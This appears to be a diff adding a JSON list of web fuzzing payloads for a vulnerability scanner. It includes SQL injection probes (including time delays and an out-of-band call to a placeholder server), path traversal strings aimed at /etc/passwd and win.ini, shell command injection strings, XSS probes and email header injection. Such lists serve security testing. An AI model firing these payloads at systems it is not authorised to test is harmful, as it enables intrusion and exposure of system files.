@@ -1,0 +1,115 @@
+{
+"fuzz_string_0":{"fuzz_string":"'"}
+,
+"fuzz_string_1":{"fuzz_string":"'--"}
+,
+"fuzz_string_2":{"fuzz_string":"' or 1=1--"}
+,
+"fuzz_string_3":{"fuzz_string":"1 or 1=1--"}
+,
+"fuzz_string_4":{"fuzz_string":"' or 1 in (@@version)--"}
+,
+"fuzz_string_5":{"fuzz_string":"1 or 1 in (@@version)--"}
+,
+"fuzz_string_6":{"fuzz_string":"'; waitfor delay '0:30:0'--"}
+,
+"fuzz_string_7":{"fuzz_string":"1; waitfor delay '0:30:0'--"}
+,
+"fuzz_string_8":{"fuzz_string":"'||Utl_Http.request('http://<yourservername>') from dual--"}
+,
+"fuzz_string_9":{"fuzz_string":"1||Utl_Http.request('http://<yourservername>') from dual--"}
+,
+"fuzz_string_10":{"fuzz_string":"xsstest"}
+,
+"fuzz_string_11":{"fuzz_string":"xsstest%00%22<>'"}
+,
+"fuzz_string_12":{"fuzz_string":"</foo>"}
+,
+"fuzz_string_13":{"fuzz_string":"<foo></foo>"}
+,
+"fuzz_string_14":{"fuzz_string":"))))))))))"}
+,
+"fuzz_string_15":{"fuzz_string":"../../../../../../../../../../etc/passwd"}
+,
+"fuzz_string_16":{"fuzz_string":"../../../../../../../../../../boot.ini"}
+,
+"fuzz_string_17":{"fuzz_string":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd"}
+,
+"fuzz_string_18":{"fuzz_string":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini"}
+,
+"fuzz_string_19":{"fuzz_string":"../../../../../../../../../../windows/win.ini"}
+,
+"fuzz_string_20":{"fuzz_string":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"}
+,
+"fuzz_string_21":{"fuzz_string":"|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &"}
+,
+"fuzz_string_22":{"fuzz_string":"| ping -i 30 127.0.0.1 |"}
+,
+"fuzz_string_23":{"fuzz_string":"| ping -n 30 127.0.0.1 |"}
+,
+"fuzz_string_24":{"fuzz_string":"& ping -i 30 127.0.0.1 &"}
+,
+"fuzz_string_25":{"fuzz_string":"& ping -n 30 127.0.0.1 &"}
+,
+"fuzz_string_26":{"fuzz_string":"; ping 127.0.0.1 ;"}
+,
+"fuzz_string_27":{"fuzz_string":"%0a ping -i 30 127.0.0.1 %0a"}
+,
+"fuzz_string_28":{"fuzz_string":"`ping 127.0.0.1`"}
+,
+"fuzz_string_29":{"fuzz_string":"| id"}
+,
+"fuzz_string_30":{"fuzz_string":"& id"}
+,
+"fuzz_string_31":{"fuzz_string":"; id"}
+,
+"fuzz_string_32":{"fuzz_string":"%0a id %0a"}
+,
+"fuzz_string_33":{"fuzz_string":"`id`"}
+,
+"fuzz_string_34":{"fuzz_string":";echo 111111"}
+,
+"fuzz_string_35":{"fuzz_string":"echo 111111"}
+,
+"fuzz_string_36":{"fuzz_string":"response.write 111111"}
+,
+"fuzz_string_37":{"fuzz_string":":response.write 111111"}
+,
+"fuzz_string_38":{"fuzz_string":"http://<yourservername>/"}
+,
+"fuzz_string_39":{"fuzz_string":"<youremail>%0aCc:<youremail>"}
+,
+"fuzz_string_40":{"fuzz_string":"<youremail>%0d%0aCc:<youremail>"}
+,
+"fuzz_string_41":{"fuzz_string":"<youremail>%0aBcc:<youremail>"}
+,
+"fuzz_string_42":{"fuzz_string":"<youremail>%0d%0aBcc:<youremail>"}
+,
+"fuzz_string_43":{"fuzz_string":"%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+tst%0afoo%0a%2e%0a"}
+,
+"fuzz_string_44":{"fuzz_string":"%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0d%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a"}
+,
+"fuzz_string_45":{"fuzz_string":"1111111111111111111111111111111111111111111111"}
+,
+"fuzz_string_46":{"fuzz_string":"-1111111111111111111111111111111111111111111111"}
+,
+"fuzz_string_47":{"fuzz_string":"0.111111111111111111111111111111111111111111111"}
+,
+"fuzz_string_48":{"fuzz_string":"-0.11111111111111111111111111111111111111111111"}
+,
+"fuzz_string_49":{"fuzz_string":"1.11e11"}
+,
+"fuzz_string_50":{"fuzz_string":"-1.11e11"}
+,
+"fuzz_string_51":{"fuzz_string":"1.11e-11"}
+,
+"fuzz_string_52":{"fuzz_string":"-1.11-e11"}
+,
+"fuzz_string_53":{"fuzz_string":"1.1111111111111111111111111111e11111111111111111111111111111111111"}
+,
+"fuzz_string_54":{"fuzz_string":"1.111111111111111111111111111e-11111111111111111111111111111111111"}
+,
+"fuzz_string_55":{"fuzz_string":"-1.1111111111111111111111111111e11111111111111111111111111111111111"}
+,
+"fuzz_string_56":{"fuzz_string":"-1.111111111111111111111111111e-11111111111111111111111111111111111"}
+}
